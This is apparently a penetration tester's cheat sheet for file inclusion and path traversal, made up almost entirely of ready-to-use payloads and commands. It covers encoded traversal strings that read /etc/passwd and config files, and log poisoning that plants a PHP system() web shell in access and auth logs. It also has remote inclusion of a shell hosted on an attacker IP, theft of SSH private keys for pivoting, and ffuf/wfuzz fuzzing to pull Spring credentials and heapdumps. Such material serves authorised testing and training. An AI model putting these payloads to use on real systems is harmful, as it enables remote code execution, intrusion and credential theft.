# LFI / RFI / path traversal — manual reference

## Traversal variants (bump depth up to ~10)
../../../../../../../../etc/passwd
..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd          # double-encode (decoded twice)
....//....//....//etc/passwd                 # strips "../" once -> still "../"
..%c0%af..%c0%afetc/passwd                   # overlong UTF-8 (legacy)
/etc/passwd                                  # absolute
/var/www/html/config.php
C:\windows\win.ini                           # Windows
..\..\..\..\windows\system32\drivers\etc\hosts

## PHP wrappers

## php_filter_chain -> RCE from a pure base64 read (no wrappers needed)
# generate with: python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]);?>'
# (synacktiv/php_filter_chain_generator) then: ?page=<long php://filter chain>&0=id

## Log poisoning (LFI that can include a tainted file -> RCE)
# 1) taint a log with PHP:
curl http://app/ -A '<?php system($_GET[0]); ?>'          # User-Agent into access.log
ssh '<?php system($_GET[0]);?>'@TARGET                    # into /var/log/auth.log
# 2) include it:
?page=/var/log/apache2/access.log&0=id
?page=/var/log/nginx/access.log&0=id
?page=/var/log/auth.log&0=id
?page=/proc/self/environ&0=id                             # taint via User-Agent
?page=/proc/self/fd/0&0=id

## RFI (allow_url_include=On). Host shell.txt on your box; trailing ? eats the appended ext.
?page=http://YOUR_IP:PORT/shell.txt?
?page=data:text/plain,<?php system($_GET[0]);?>&0=id

## id_rsa -> SSH pivot (read a private key via traversal, then log in)
# ?page=../../../../../home/<user>/.ssh/id_rsa   (user from /etc/passwd home field)
chmod 600 id_rsa ; ssh -i id_rsa -p <port> <user>@<target>   # note nmap's SSH port (often 2222)

## Spring Boot / Java — the config holds creds/API keys. Depth varies, so fuzz PATH x FILE:
# build two wordlists and cluster-bomb them at the vulnerable param:
#   paths.txt: ../  ../../  ../../../ ... ../../../../../../
#   files.txt: application.properties  application.yml  config/application.properties  WEB-INF/classes/application.properties
ffuf -u 'http://target/page?file=PATHFILE' -w paths.txt:PATH -w files.txt:FILE -mode clusterbomb -fs 0
wfuzz -w paths.txt -w files.txt --hh 0 'http://target/page?file=FUZZFUZ2Z'
# then read it directly, e.g.  ?file=../config/application.properties   (grep for password/secret/api-key)
/actuator/env  /actuator/heapdump  /actuator/mappings    # if Spring actuator is exposed
